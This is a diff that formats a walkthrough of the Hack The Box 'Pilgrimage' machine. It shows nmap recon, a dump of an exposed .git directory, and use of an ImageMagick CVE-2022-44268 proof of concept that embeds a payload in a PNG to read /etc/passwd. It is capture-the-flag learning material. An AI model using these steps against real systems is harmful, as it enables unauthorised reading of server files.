@@ -1,3 +1,6 @@
+Nmap reveals a webpage and that it has a  .git.
+
+```
 ──╼ [★]$ nmap pilgrimage.htb -sC -A -T4 -A -Pn
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-29 22:30 BST
 Nmap scan report for pilgrimage.htb (10.129.183.130)
@@ -22,15 +25,23 @@ PORT   STATE SERVICE VERSION
 |_      httponly flag not set
 |_http-server-header: nginx/1.18.0
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
 
+Run git-dumper to get all of the files.
 
-
+```
 └──╼ [★]$ git-dumper http://pilgrimage.htb/.git/ DIR
+```
 
 
+```
 └──╼ [★]$ ls
 assets  dashboard.php  index.php  login.php  logout.php  magick  register.php  vendor
+```
 
+Checking the magick verison we can find an exploit to run.
+
+```
 └──╼ [★]$ ./magick -version
 Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
 Copyright: (C) 1999 ImageMagick Studio LLC
@@ -38,22 +49,23 @@ License: https://imagemagick.org/script/license.php
 Features: Cipher DPC HDRI OpenMP(4.5) 
 Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
 Compiler: gcc (7.5)
-
+```
 
 https://www.metabaseq.com/imagemagick-zero-days/
 
 
 https://github.com/voidz0r/CVE-2022-44268
 
+```
 └──╼ [★]$ sudo pip3 install pypng
 Collecting pypng
   Downloading pypng-0.20220715.0-py3-none-any.whl (58 kB)
      |████████████████████████████████| 58 kB 4.3 MB/s 
 Installing collected packages: pypng
 Successfully installed pypng-0.20220715.0
+```
 
-
-
+```
 └──╼ [★]$ sudo python3 generate.py -f "/etc/passwd" -o exploit1
 
    [>] ImageMagick LFI PoC - by Sybil Scan Research <research@sybilscan.com>
@@ -61,7 +73,7 @@ Successfully installed pypng-0.20220715.0
    [>] Blank PNG generated
    [>] Placing Payload to read /etc/passwd
    [>] PoC PNG generated > exploit1
-
+```
 
 └──╼ [★]$ sudo wget http://pilgrimage.htb/shrunk/64a32325a387c.png
 --2023-07-03 20:36:46--  http://pilgrimage.htb/shrunk/64a32325a387c.png
